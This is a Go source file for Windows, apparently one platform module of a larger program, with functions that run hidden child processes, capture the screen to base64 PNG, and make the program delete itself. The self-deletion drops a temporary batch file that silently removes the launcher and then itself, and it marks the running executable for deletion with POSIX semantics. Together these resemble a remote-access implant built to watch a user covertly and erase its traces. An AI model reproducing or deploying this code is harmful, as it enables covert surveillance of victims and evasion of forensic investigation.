//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
)

const (
	fileDispositionInformationExClass = 64
	fileDispositionFlagDelete         = 0x00000001
	fileDispositionFlagPosixSemantics = 0x00000002
)

type fileDispositionInfoEx struct {
	Flags uint32
}

func init() {
	doSelfDelete = doSelfDeleteWindows
	setOSSpecificAttrs = setOSSpecificAttrsWindows
	takeScreenshot = takeScreenshotWindows
}

func setOSSpecificAttrsWindows(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
}

func takeScreenshotWindows() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	if bounds.Dx() == 0 || bounds.Dy() == 0 {

		for i := 0; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			if b.Dx() > 0 && b.Dy() > 0 {
				bounds = b
				break
			}
		}
		if bounds.Dx() == 0 || bounds.Dy() == 0 {
			return "", fmt.Errorf("failed to get valid display bounds for any display")
		}
	}

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("failed to capture screen: %w", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "", fmt.Errorf("failed to encode png: %w", err)
	}

	imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
	return imgBase64Str, nil
}

func deleteFileViaBatch(targetFilePath string) {
	if targetFilePath == "" {
		return
	}
	absTargetFilePath, err := filepath.Abs(targetFilePath)
	if err != nil {
		return
	}

	if _, statErr := os.Stat(absTargetFilePath); os.IsNotExist(statErr) {
		return
	}
	batchContent := fmt.Sprintf(`@echo off
chcp 65001 > nul
setlocal
:: Attempt to delete the target file. The delay has already occurred in the parent Go process.
del /F /Q "%s"
:: Delete this batch script itself
(goto) 2>nul & del "%%~f0"
exit /b
`, absTargetFilePath)
	tempDir := os.TempDir()

	batchFileName := fmt.Sprintf("del_file_proc%d_time%d.bat", os.Getpid(), time.Now().UnixNano())
	batchFilePath := filepath.Join(tempDir, batchFileName)

	err = os.WriteFile(batchFilePath, []byte(batchContent), 0700)
	if err != nil {
		return
	}

	cmd := exec.Command("cmd.exe", "/C", batchFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000 | 0x00000008,
	}
	if err := cmd.Start(); err == nil {
		if cmd.Process != nil {
			_ = cmd.Process.Release()
		}
	} else {
		_ = os.Remove(batchFilePath)
	}
}
func markFileForDeleteOnCloseAndPosixSemantics(filePath string) error {
	if filePath == "" {
		return fmt.Errorf("filePath cannot be empty for markFileForDeleteOnCloseAndPosixSemantics")
	}
	absFilePath, err := filepath.Abs(filePath)
	if err != nil {
		return fmt.Errorf("filepath.Abs for %s failed: %w", filePath, err)
	}

	if _, statErr := os.Stat(absFilePath); os.IsNotExist(statErr) {
		return nil
	}
	pwcPath, err := windows.UTF16PtrFromString(absFilePath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed for %s: %w", absFilePath, err)
	}
	handle, err := windows.CreateFile(
		pwcPath,
		windows.DELETE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return fmt.Errorf("CreateFile with DELETE access failed for %s: %w. (Is it already marked or locked by another process without share-delete?)", absFilePath, err)
	}
	defer windows.CloseHandle(handle)
	disposition := fileDispositionInfoEx{
		Flags: fileDispositionFlagDelete | fileDispositionFlagPosixSemantics,
	}
	err = windows.SetFileInformationByHandle(handle, fileDispositionInformationExClass, (*byte)(unsafe.Pointer(&disposition)), uint32(unsafe.Sizeof(disposition)))
	if err != nil {
		return fmt.Errorf("SetFileInformationByHandle with POSIX semantics failed for %s: %w", absFilePath, err)
	}
	return nil
}
func doSelfDeleteWindows(selfExePath string, originalLauncherPath string) {

	if originalLauncherPath != "" && originalLauncherPath != selfExePath {
		deleteFileViaBatch(originalLauncherPath)
	} else {

	}
	if err := markFileForDeleteOnCloseAndPosixSemantics(selfExePath); err != nil {
	}
}
